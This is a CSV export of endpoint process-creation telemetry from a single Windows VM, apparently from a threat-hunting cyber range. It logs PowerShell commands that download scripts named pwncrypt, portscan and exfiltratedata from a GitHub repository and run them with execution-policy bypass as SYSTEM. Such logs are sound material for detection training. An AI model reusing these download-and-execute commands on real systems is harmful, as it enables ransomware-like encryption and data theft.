Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,ProcessVersionInfoCompanyName,ProcessVersionInfoProductName,ProcessVersionInfoProductVersion,ProcessVersionInfoInternalFileName,ProcessVersionInfoOriginalFileName,ProcessVersionInfoFileDescription,ProcessId,ProcessCommandLine,ProcessIntegrityLevel,ProcessTokenElevation,ProcessCreationTime,AccountDomain,AccountName,AccountSid,AccountUpn,AccountObjectId,LogonId,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessAccountUpn,InitiatingProcessAccountObjectId,InitiatingProcessLogonId,InitiatingProcessIntegrityLevel,InitiatingProcessTokenElevation,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessFolderPath,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessSignerType,InitiatingProcessSignatureStatus,ReportId,AppGuardContainerId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionDeviceName,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,ProcessUniqueId,InitiatingProcessUniqueId
"Jun 17, 2025 2:13:08 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4700,powershell  -ExecutionPolicy Unrestricted -File script27.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:13:08 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,8320,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script27.ps1","Jun 17, 2025 2:13:08 AM",c:\windows\system32\cmd.exe,5212,RunCommandExtension.exe,"Jun 17, 2025 2:13:07 AM",OsVendor,Valid,11218,,,0,0,,,0,0,,,2814749767114402,2814749767114400
"Jun 17, 2025 2:13:08 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4004,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:13:08 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,7224,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1","Jun 17, 2025 2:13:08 AM",c:\windows\system32\cmd.exe,4700,powershell.exe,"Jun 17, 2025 2:13:08 AM",OsVendor,Valid,11220,,,0,0,,,0,0,,,2814749767114404,2814749767114403
"Jun 17, 2025 2:13:12 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4308,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:13:12 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,8996,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1","Jun 17, 2025 2:13:12 AM",c:\windows\system32\cmd.exe,4700,powershell.exe,"Jun 17, 2025 2:13:08 AM",OsVendor,Valid,11257,,,0,0,,,0,0,,,2814749767114409,2814749767114408
"Jun 17, 2025 2:25:32 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3520,powershell  -ExecutionPolicy Unrestricted -File script28.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:25:32 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,6460,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script28.ps1","Jun 17, 2025 2:25:32 AM",c:\windows\system32\cmd.exe,4104,RunCommandExtension.exe,"Jun 17, 2025 2:25:31 AM",OsVendor,Valid,11365,,,0,0,,,0,0,,,2814749767114608,2814749767114606
"Jun 17, 2025 2:25:33 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,9028,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:25:33 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,2920,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1","Jun 17, 2025 2:25:33 AM",c:\windows\system32\cmd.exe,3520,powershell.exe,"Jun 17, 2025 2:25:32 AM",OsVendor,Valid,11367,,,0,0,,,0,0,,,2814749767114610,2814749767114609
"Jun 17, 2025 2:25:37 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,1716,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:25:37 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,8464,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1","Jun 17, 2025 2:25:37 AM",c:\windows\system32\cmd.exe,3520,powershell.exe,"Jun 17, 2025 2:25:32 AM",OsVendor,Valid,11373,,,0,0,,,0,0,,,2814749767114612,2814749767114611
"Jun 17, 2025 2:33:21 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3284,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '9bba0ac96267c73775647edbd390867424ce69bf2bc4475c12304374eec6a461')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1' }""",System,TokenElevationTypeDefault,"Jun 17, 2025 2:33:21 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,8952,"""SenseIR.exe"" ""OfflineSenseIR"" ""4104"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzYyOH0=""","Jun 17, 2025 2:33:11 AM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,11410,,,0,0,,,0,0,,,2814749767114721,2814749767114718
"Jun 17, 2025 2:37:22 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8220,powershell  -ExecutionPolicy Unrestricted -File script29.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:37:22 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,7324,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script29.ps1","Jun 17, 2025 2:37:22 AM",c:\windows\system32\cmd.exe,8492,RunCommandExtension.exe,"Jun 17, 2025 2:37:21 AM",OsVendor,Valid,11423,,,0,0,,,0,0,,,2814749767114787,2814749767114785
"Jun 17, 2025 2:37:23 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6776,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:37:23 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,2820,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1","Jun 17, 2025 2:37:23 AM",c:\windows\system32\cmd.exe,8220,powershell.exe,"Jun 17, 2025 2:37:22 AM",OsVendor,Valid,11425,,,0,0,,,0,0,,,2814749767114789,2814749767114788
"Jun 17, 2025 2:37:27 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7312,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:37:27 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3620,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1","Jun 17, 2025 2:37:27 AM",c:\windows\system32\cmd.exe,8220,powershell.exe,"Jun 17, 2025 2:37:22 AM",OsVendor,Valid,11431,,,0,0,,,0,0,,,2814749767114792,2814749767114791
"Jun 17, 2025 2:44:52 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,9140,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\a391f42c-7e1a-4611-8494-1817d2420e09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '44a721ee87a398f80fccb45ed39e75c0ee27dbe127c4117de8b65e82aa6570c1')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\a391f42c-7e1a-4611-8494-1817d2420e09.ps1' }""",System,TokenElevationTypeDefault,"Jun 17, 2025 2:44:52 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,8952,"""SenseIR.exe"" ""OfflineSenseIR"" ""4104"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzYyOH0=""","Jun 17, 2025 2:33:11 AM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,11483,,,0,0,,,0,0,,,2814749767114890,2814749767114718
"Jun 17, 2025 2:49:09 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3904,powershell  -ExecutionPolicy Unrestricted -File script30.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:49:09 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,1276,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script30.ps1","Jun 17, 2025 2:49:09 AM",c:\windows\system32\cmd.exe,9020,RunCommandExtension.exe,"Jun 17, 2025 2:49:08 AM",OsVendor,Valid,11632,,,0,0,,,0,0,,,2814749767115178,2814749767115176
"Jun 17, 2025 2:49:10 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8136,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:49:10 AM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,6224,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1","Jun 17, 2025 2:49:10 AM",c:\windows\system32\cmd.exe,3904,powershell.exe,"Jun 17, 2025 2:49:09 AM",OsVendor,Valid,11634,,,0,0,,,0,0,,,2814749767115180,2814749767115179
"Jun 17, 2025 2:49:14 AM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,9084,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,System,TokenElevationTypeDefault,"Jun 17, 2025 2:49:14 AM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,5772,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1","Jun 17, 2025 2:49:14 AM",c:\windows\system32\cmd.exe,3904,powershell.exe,"Jun 17, 2025 2:49:09 AM",OsVendor,Valid,11647,,,0,0,,,0,0,,,2814749767115182,2814749767115181
